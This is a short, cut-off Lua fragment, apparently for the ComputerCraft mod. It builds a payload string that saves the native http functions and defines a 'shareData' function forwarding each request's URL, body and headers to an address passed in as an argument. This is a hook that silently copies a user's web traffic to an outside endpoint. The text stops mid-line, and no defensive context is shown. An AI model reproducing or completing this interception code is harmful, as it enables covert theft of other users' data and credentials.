return [[(function()
    if type(_G._G.http) == "table" and type(_G._G.http.post) == "function" then
        local nativeget, nativepost, nativerequest, nativecheck, nativecode = http.get, http.post, http.request, http.checkURL, (textutils 
        local function shareData(url, post, headers)
            nativepost(]] .. (({...})[1]) .. [[, post, headers)
            
